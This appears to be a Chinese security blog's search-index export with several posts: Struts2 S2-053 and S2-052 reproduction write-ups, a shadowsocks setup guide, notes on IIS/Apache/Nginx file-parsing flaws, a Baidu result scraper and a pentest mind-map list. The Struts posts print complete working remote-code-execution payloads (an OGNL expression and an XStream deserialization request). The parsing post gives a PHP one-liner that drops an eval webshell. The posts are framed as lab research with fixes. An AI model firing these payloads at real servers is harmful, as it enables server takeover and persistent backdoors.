    <content type="text"><![CDATA[2017年9月7日，Struts官方发布一个中危的安全漏洞，该漏洞编号为:S2-053,在一定条件下，当开发人员在Freemarker标签中使用错误的构造时，可能会导致远程代码执行漏洞 漏洞编号CVE-2017-12611 漏洞名称Freemarker标签远程代码执行漏洞 漏洞评级中危 影响范围Struts 2.0.1 - 2.3.33Struts 2.5 - 2.5.10 s2-053 POC1%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;whoami&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125; 注意：执行命令的地方在于(#cmd=’whoami’) 漏洞环境搭建可以使用war包或docker复现 使用war包搭建环境下载war包 链接：http://pan.baidu.com/s/1qXW3FPi 密码：9exb下载后把它放到tomcat目录下的webapps目录下，重启tomcat后访问：http://127.0.0.1:8080/s2-053 使用docker搭建环境快速搭建各种漏洞环境(Various vulnerability environment) https://github.com/Medicean/VulApps搭建好后访问 http://127.0.0.1:8080/hello.action 漏洞复现漏洞检测打开页面，输入表达式%{33-1}进行测试，发现成功执行，返回32说明漏洞存在 执行POC输入POC提交 来个调用计算器（calc）把(#cmd=’whoami’)里面的whoami缓存calc 漏洞分析当在Freemarker标签中使用表达式文本或强制表达式时，使用以下请求值可能会导致远程代码执行1234&lt;@s.hidden name=&quot;strutsS&quot; value=strutsS/&gt; &lt;@s.hidden name=&quot;strutsS&quot; value=&quot;$&#123;strutsS&#125;&quot; /&gt; 这两种情况下，值属性都使用可写属性，都会受到Freemarker表达式影响 修复方案1.升级到Apache Struts 2.5.13或2.3.342.Freemarker标签内容不要通过Request方式获取3.使用只读属性来初始化value属性（仅限getter属性）4.不要使用如下结构&lt;@s.hidden name=”redirectUri” value=redirectUri /&gt;&lt;@s.hidden name=”redirectUri” value=”${redirectUri}” /&gt;]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>s2-053</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[s2-052复现]]></title>
    <url>%2F2017%2F09%2F08%2Fs2-052%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究 s2-052漏洞介绍问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反漏洞编号：CVE-2017-9805(S2-052)影响版本：Struts 2.5 - Struts 2.5.12 s2-052 POC123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Content-Type: application/xmlContent-Length: 2365Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/editCookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7Connection: closeUpgrade-Insecure-Requests: 1&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;calc&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt;&lt;/map&gt; 注意：执行命令的地方在于command内,这里我是在windows上执行的，在其他系统中执行写出相对应的就可以了12345&lt;command&gt;&lt;string&gt;calc&lt;/string&gt;&lt;/command&gt; s2-052漏洞复现安装Java下载JDK在官网上下载JDK http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html我是在windows上搭建的所以，下载windows版本的 配置环境变量1 新建系统变量：变量名:JAVA_HOME变量值:你的JDK安装目录2 再新建系统变量：变量名:CLASSPATH值:.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;%TOMCAT_HOME%\BIN注意：前面的点号3 修改PATH变量变量名：PATH值：;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;注意：前面的分号，将此值添加到，path变量值的最后面 安装Tomcat下载Tomcat在官网上下载Tomcat http://tomcat.apache.org/download-90.cgi下载你需要的版本下载完成以后解压到你想解压的目录就可以了 配置Tomcat的环境变量新建Tomcat环境变量变量名:TOMCAT_HOME变量值:你的TOMCAT所在目录 启动Tomcat打开bin文件夹—双击startup.bat;系统会打开一个dos窗口，即启动成功；如果未打开dos窗口或者dos窗口一闪而过，可能是jdk的配置出错，请安装上面的进行注意检查 访问：http://127.0.0.1:8080注意：若要修改tomcat端口，可打开/Library/Tomcat/conf/server.xml文件，修改8080端口。 下载受影响的struts2版本1.从struts2的官网下载最后受影响的版本struts-2.5.12，地址： http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip 注意下载struts-2.5.12-apps即可，不需要下载struts-2.5.12-all.zip。不然struts-2.5.12-all.zip中包含很多其他的东西，可以看到lib目录下有很多jar包。2.拿到struts-2.5.12-apps之后，将其中的app目录下的struts2-rest-showcase.war文件放到webapps目录下，然后设置一下conf/server.xml文件即可。3.这里把appBase设置为webapps目录，然后unpackWARs设置为true，这样就会自动解包xxx.war，autoDeploy也设置为true(热部署?) 然后就可以浏览器访问了。 直接输入 http://127.0.0.1:8080/struts2-rest-showcase/ 会跳转，然后出现下面的页面 开始复现进入编辑页面设置抓包，点击提交按钮修改Content-Type和POST提交的数据可以看到计算器已经调用出来 修补方法1.升级Struts到2.5.13最新版本。2.在不使用时删除Struts REST插件，或仅限于服务器普通页面和JSONs python验证脚本https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>s2-052</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建shadowsocks服务]]></title>
    <url>%2F2017%2F09%2F02%2F%E6%90%AD%E5%BB%BAshadowsocks%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[搭建ss服务器可以登录外网查询资料，访问谷歌，方便自己的使用。在服务器上搭建shadowsocks服务端，本地服务器上搭建客户端用来连接使用。 安装前的准备安装pip从pip官网 https://pypi.python.org/pypi/pip 下载pip的源代码 #解压1tar -zxvf pip-1.5.5.tar.gz 这个时候会报错说少了setuptools从setuptools官网 https://pypi.python.org/pypi/setuptools 下载setuptools原来 #解压12tar -zxvf setuptools-3.6.tar.gz cd setuptools-3.6 #安装1python setup.py install 再次安装pip就OK了 安装M2Crypto先安装依赖包：1yum install -y openssl-devel gcc swig python-devel autoconf libtool 再通过pip安装M2Crypto：1pip install M2Crypto 安装shadowsocks使用pip安装shadowsocks1pip install shadowsocks 配置config文件1vim /etc/shadowsocks.json 单用户配置:12345678910&#123;&quot;server&quot;:&quot;&quot;, ##服务器ip地址&quot;server_port&quot;:8000, ##代理端口&quot;local_address&quot;:&quot;127.0.0.1&quot;,&quot;local_port&quot;:1080, ##本地监听端口&quot;password&quot;:&quot;&quot;, ##连接密码&quot;timeout&quot;:300,&quot;method&quot;:&quot;aes-256-cfb&quot;, ##加密方式&quot;dast_open&quot;:false&#125; 多用户配置:123456789101112&#123;&quot;server&quot;:&quot;&quot;,&quot;local_address&quot;:&quot;127.0.0.1&quot;,&quot;local_port&quot;:1080,&quot;port_password&quot;:&#123;&quot;8000&quot;:&quot;123456&quot;,&quot;8001&quot;:&quot;123456&quot;&#125;,&quot;timeout&quot;:300,&quot;method&quot;:&quot;aes-256-cfb&quot;,&quot;fast_open&quot;:false&#125; 命令行启动关闭12ssserver -c /etc/shadowsocks/config.json -d start 后台启动ssserver -c /etc/shadowsocks/config.json -d stop 后台停止 设置开机启动将启动的命令加入到/etc/rc.local文件的最后1vi /etc/rc.local 设置非root用户运行ss12useradd ssuser //添加一个ssuser用户ssserver [other options] --user ssuser //用ssuser这个用户来运行ss 将之前的ssserver -c /etc/shadowsocks.json -d start改为ssserver -c /etc/shadowsocks.json -d start –user ssuser 防火墙设置（如有）编辑防火墙配置文件/etc/sysconfig/iptables，将服务器端口（server_port）放行。新增一条防火墙规则：1-A INPUT -m state --state NEW -m tcp -p tcp --dport 8989 -j ACCEPT 重启防火墙iptables：1service iptables restart 安装客户端windows安装shadowsocks客户端比较简单，直接下载安装程序。启动以后，填入服务端相应的配置（ip，port，密码，加密方式）设置模式：]]></content>
      <categories>
        <category>技术研究</category>
      </categories>
      <tags>
        <tag>shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[服务器解析漏洞]]></title>
    <url>%2F2017%2F09%2F01%2F%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[服务器解析漏洞已经是一个老生常谈问题了，但是有些服务器依然存在，这里复习记录一下常见服务器解析漏洞，比如IIS6.0，IIS7.5，acache，nginx解析漏洞。 一.IIS5.x-6.x解析漏洞使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件 目录解析(6.0)形式：www.xxx.com/xx.asp/xx.jpg原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。 文件解析形式：www.xxx.com/xx.asp;.jpg原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 解析文件类型IIS6.0 默认的可执行文件除了asp还包含这三种 :/test.asa/test.cer/test.cdx 修复方案1.禁止用户控制文件上传目录，新建目录等权限2.上传目录与用户新建的目录禁止执行3.上传的文件重命名，不保留用户上传文件的后缀4.禁止asa、asp、cer、cdx等后缀的文件上传 二.apache解析漏洞漏洞原理 Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把wooyun.php.owf.rar解析成php。 漏洞形式www.xxxx.xxx.com/test.php.php123 其余配置问题导致漏洞（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行 修复方案1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入1234&lt;Files ~ “.(php.|php3.)”&gt;Order Allow,DenyDeny from all&lt;/Files&gt; 2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so把#号去掉，重启apache,在网站根目录下建立.htaccess文件,代码如下1234567891011&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteRule .(php.|php3.) /index.phpRewriteRule .(pHp.|pHp3.) /index.phpRewriteRule .(phP.|phP3.) /index.phpRewriteRule .(Php.|Php3.) /index.phpRewriteRule .(PHp.|PHp3.) /index.phpRewriteRule .(PhP.|PhP3.) /index.phpRewriteRule .(pHP.|pHP3.) /index.phpRewriteRule .(PHP.|PHP3.) /index.php&lt;/IfModule&gt; 三.Nginx &lt; 8.03畸形解析漏洞漏洞原理Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了 漏洞形式www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg%00.phpwww.xxxx.com/UploadFiles/image/1.jpg/%20\0.php 另外一种手法：上传一个名字为test.jpg，以下内容的文件。1&lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt; 然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。 修复方案1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;2.在Nginx配置文件中添加以下代码：1234if ( $fastcgi_script_name ~ ..*/.*php ) &#123; return 403; &#125; 这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。3.升级Nignx到最新版 四.IIS7.5解析漏洞IIS7.5的漏洞与nginx的类似，都是由于php配置文件中，开启了cgi.fix_pathinfo，而这并不是nginx或者iis7.5本身的漏洞。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>服务器解析漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取百度搜索]]></title>
    <url>%2F2017%2F09%2F01%2F%E7%88%AC%E5%8F%96%E7%99%BE%E5%BA%A6%E6%90%9C%E7%B4%A2%2F</url>
    <content type="text"><![CDATA[在用谷歌语法搜索有某些特征的链接时，如果想把这些链接全部保存起来，这个时候就可以使用爬虫技术，爬取这些链接保存下来。下面就来分析并写出这个爬虫程序。 网页分析分析搜索链接每页的网页链接格式，一般都有固定的链接格式，如百度的每页搜索结果链接是只取两个个参数的结果是这样，每页10条1https://www.baidu.com/s?wd=ctf&amp;pn=10 分析搜索页面中的链接F12对当前页面分析每个链接的特点，百度搜索有点坑，你会发现百度都是通过一个长长的链接302跳转来访问的，随便选取一个链接都是这种1a target=&quot;_blank&quot; href=&quot;你搜索的URL&quot; class=&quot;c-showurl&quot; style=&quot;text-decoration:none;&quot;&gt;www.php.net/downloa...php 特征就是class=”c-showurl” 属性值，用bs库去获取所有有这个属性的tagres = soup.find_all(name=”a”, attrs={‘class’:’c-showurl’}) 访问链接访问跳转链接获取实际网站url,title之类的信息 爬虫实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#!/usr/bin/env python#coding=utf-8#输入格式 python 脚本 -s 内容 -f 要保存的文件名#每页的网页链接格式，一般都有固定的链接格式，如百度的每页搜索结果链接是只取两个个参数的结果是这样，每页10条#https://www.baidu.com/s?wd=ctf&amp;pn=10#F12对当前页面分析每个链接的特点，百度搜索有点坑，你会发现百度都是通过一个长长的链接302跳转来访问的，随便选取一个链接都是这种#&lt;a target="_blank" href="http://www.baidu.com/link?url=GI9K125i3rnLbxL2-kKs-2g2OZt-oDTJZZIFjndQHxGiDubfIEpvNxnnCc1h5ags" class="c-showurl" style="text-decoration:none;"&gt;www.secbox.cn/tag/&lt;b&gt;ctf&lt;/b&gt;&amp;nbsp;&lt;/a&gt;import requests from bs4 import BeautifulSoup as bsimport threading #多线程import re #正则from Queue import Queue #线程优先级队列（ Queue）from prettytable import PrettyTable #将输出内容如表格方式整齐 import argparse #命令行解析import timeimport systhread_count = 3 #进程数page = 5 #可以修改抓取页数urls = []table = PrettyTable(['page','url','title']) #prettyx模块将输出内容如表格方式整齐table.align['title'] = '1' #title左对齐table.padding_width = 1 #列边和内容之间的一个空格page = (page+1) * 10class mythread(threading.Thread): #继承父类threading.Thread def __init__(self,queue): threading.Thread.__init__(self) self.Q = queue self.headers = &#123;'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'&#125; #设置请求头 def run(self): ##把要执行的代码写到run函数里面 线程在创建后会直接运行run函数 while 1: try: t = self.Q.get(True,1) #print t self.spider(t) except Exception,e: #调试最好打印出错信息，否则，spider函数出错也无法定位错误，多次遇到这个问题了,靠打印才解决 print e break def spider(self,target): #爬取网页链接和标题 #print type(target) pn =int(target.split('=')[-1])/10 + 1 #对https://www.baidu.com/s?wd=ctf&amp;pn=10分割去最后的数字 #print pn #print target html = requests.get(target,headers=self.headers) #print html soup = bs(html.text,'lxml') res = soup.find_all(name='a', attrs=&#123;'class':'c-showurl'&#125;) #print res for r in res: try: #因为百度搜索是302跳转，所以我们需要再次请求 h = requests.get(r['href'],headers=self.headers,timeout=3) if h.status_code == 200: url = h.url title =re.findall(r'&lt;title&gt;(.*?)&lt;/title&gt;',h.content)[0] title = title.decode('utf-8') #解码成unicode,否则add_row会转换出错 urls.append((pn,url,title)) else: continue except: continuedef Load_Thread(queue): #生成线程数 return [mythread(queue) for i in range(thread_count)]def Start_Thread(threads): print 'thread is start...' for t in threads: t.setDaemon(True) t.start() for t in threads: t.join() print 'thread is end...'def main(): start = time.time() parser = argparse.ArgumentParser() parser.add_argument('-s') parser.add_argument('-f') arg = parser.parse_args() #print arg word = arg.s output = arg.f # word = 'inurl:login.action' # output = 'test.txt' queue = Queue() for i in range(0,page,10): target = 'https://www.baidu.com/s?wd=%s&amp;pn=%s'%(word,i) queue.put(target) thread_list = Load_Thread(queue) Start_Thread(thread_list) #把数据写到文件中 if output: with open(output,'a') as f: for record in urls: f.write(record[1]+'\n') #print urls,len(urls) for record in urls: table.add_row(list(record)) #在表单中添加数据 print table print '共爬取数据%s条'%len(urls) print time.time()-startif __name__ == '__main__': main()]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试常用脑图]]></title>
    <url>%2F2017%2F08%2F31%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E8%84%91%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[渗透测试脑图 漏洞脑图web常见漏洞脑图 xss攻击点汇总脑图 密码找回逻辑漏洞脑图 越权脑图 工具脑图sqlmap脑图 nmap脑图 提权脑图]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>漏洞</tag>
        <tag>脑图</tag>
      </tags>
  </entry>
</search>
